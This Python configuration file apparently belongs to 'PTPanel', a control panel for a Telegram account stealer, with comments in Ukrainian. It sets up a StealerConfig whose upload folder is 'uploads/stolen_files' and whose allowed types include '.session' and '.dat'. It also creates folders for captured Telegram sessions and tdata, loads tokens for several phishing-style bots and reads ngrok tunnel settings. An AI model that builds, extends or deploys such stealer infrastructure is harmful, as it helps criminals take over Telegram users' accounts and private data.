# config.py
import os
import logging
import sys
from dataclasses import dataclass
from typing import List, Optional

# Fix Unicode encoding for Windows
if sys.platform == "win32":
    import codecs
    if hasattr(sys.stdout, 'buffer'):
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    if hasattr(sys.stderr, 'buffer'): 
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

@dataclass
class DatabaseConfig:
    url: str
    pool_size: int = 20
    max_overflow: int = 30
    echo: bool = False
    pool_pre_ping: bool = True

@dataclass
class TelegramConfig:
    api_id: int
    api_hash: str
    bot_tokens: List[str]
    phone: Optional[str] = None

@dataclass
class AdminConfig:
    username: str
    password: str
    session_timeout: int = 3600
    max_login_attempts: int = 5
    cookie_secure: bool = False

@dataclass
class ServerConfig:
    host: str
    port: int
    debug: bool
    secret_key: str
    app_name: str = "PTPanel"
    upload_limit: int = 100 * 1024 * 1024

@dataclass
class StealerConfig:
    encryption_key: str
    max_file_size: int = 50 * 1024 * 1024
    upload_dir: str = "uploads/stolen_files"
    allowed_extensions: List[str] = None

    def __post_init__(self):
        if self.allowed_extensions is None:
            self.allowed_extensions = ['.txt', '.zip', '.session', '.json', '.dat']

@dataclass
class PathConfig:
    templates_dir: str = "templates"
    static_dir: str = "static"
    uploads_dir: str = "uploads"
    logs_dir: str = "logs"
    sessions_dir: str = "uploads/sessions"
    tdata_dir: str = "uploads/tdata"

@dataclass
class LoggingConfig:
    level: str = "INFO"
    format: str = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    file: str = "logs/ptpanel.log"
    max_bytes: int = 10 * 1024 * 1024
    backup_count: int = 5

class PTPanelConfig:
    def __init__(self):
        # Системні налаштування (залишаються в .env)
        self.db = DatabaseConfig(
            url=os.getenv('DATABASE_URL'),
            echo=os.getenv('DEBUG', 'False').lower() == 'true'
        )
        
        # Секретні ключі (залишаються в .env)
        self.server = ServerConfig(
            host=os.getenv('HOST', '0.0.0.0'),
            port=int(os.getenv('PORT', '5000')),
            debug=os.getenv('DEBUG', 'False').lower() == 'true',
            secret_key=os.getenv('SECRET_KEY'),
            app_name="PTPanel"
        )
        
        self.stealer = StealerConfig(
            encryption_key=os.getenv('ENCRYPTION_KEY')
        )
        
        # Адмін налаштування (з .env)
        self.admin = AdminConfig(
            username=os.getenv('ADMIN_USERNAME'),
            password=os.getenv('ADMIN_PASSWORD'),
            cookie_secure=os.getenv('DEBUG', 'False').lower() != 'true'
        )
        
        # Telegram налаштування (будуть оновлюватись з БД)
        self.telegram = TelegramConfig(
            api_id=0,
            api_hash='',
            bot_tokens=[],
            phone=None
        )
        
        # Paths
        self.paths = PathConfig()
        
        # Logging
        self.logging = LoggingConfig()
        
        # Ngrok
        self.ngrok_auth_token = os.getenv('NGROK_AUTH_TOKEN')
        self.ngrok_domain = os.getenv('NGROK_DOMAIN')
        
        # Validate configuration
        self._validate_config()
        
        # Create necessary directories
        self._create_directories()
        
        # Print config info
        self._print_config_info()
    
    def _validate_config(self):
        """Validate configuration and log warnings"""
        if not self.telegram.api_id or not self.telegram.api_hash:
            logger.warning("Telegram API ID or HASH not set. Some features may not work.")
        
        if not self.telegram.bot_tokens:
            logger.warning("No bot tokens configured. Bot features will be disabled.")
        
        if self.server.debug:
            logger.warning("DEBUG mode is enabled. Do not use in production!")
        
        if len(self.server.secret_key) < 16:
            logger.warning("SECRET_KEY is too short. Consider using a longer key.")
        
        if len(self.stealer.encryption_key) < 32:
            logger.warning("ENCRYPTION_KEY is too short. Using default may be insecure.")
    
    def _create_directories(self):
        """Create necessary directories if they don't exist"""
        directories = [
            self.paths.uploads_dir,
            self.stealer.upload_dir,
            'uploads/sessions',
            'uploads/tdata',
            self.paths.logs_dir,
            'configs/users'
        ]
        
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            logger.debug(f"Created directory: {directory}")
    
    def _print_config_info(self):
        """Print configuration information"""
        print(f">>> PTPanelConfig - Using DATABASE_URL: {self.db.url}")
        print(f">>> Admin user: {self.admin.username}")
        if self.server.debug:
            print(">>> WARNING: DEBUG mode is enabled. Do not use in production!")
    
    def refresh_telegram_config(self, admin_id=1):
        """Оновлення Telegram конфігурації з БД"""
        try:
            from core.config_manager import config_manager
            
            # Завантажуємо налаштування з БД
            telegram_config = config_manager.load_user_config(admin_id, 'telegram')
            bots_config = config_manager.load_user_config(admin_id, 'bots')
            
            # Оновлюємо конфіг
            if telegram_config.get('api_id'):
                self.telegram.api_id = int(telegram_config['api_id'])
            if telegram_config.get('api_hash'):
                self.telegram.api_hash = telegram_config['api_hash']
            if telegram_config.get('phone_number'):
                self.telegram.phone = telegram_config['phone_number']
            
            # Збираємо токени ботів
            tokens = []
            token_keys = ['webapp_token', 'classic_token', 'multitool_token', 'admin_token']
            for key in token_keys:
                token = bots_config.get(key)
                if token and ':' in token:
                    tokens.append(token)
                    logger.info(f"Loaded bot token: {token[:10]}...")
            
            self.telegram.bot_tokens = tokens
            logger.info(f"Refreshed Telegram config: API_ID={self.telegram.api_id}, {len(tokens)} bot tokens")
            
        except Exception as e:
            logger.error(f"Failed to refresh Telegram config: {e}")

# Global config instance
config = PTPanelConfig()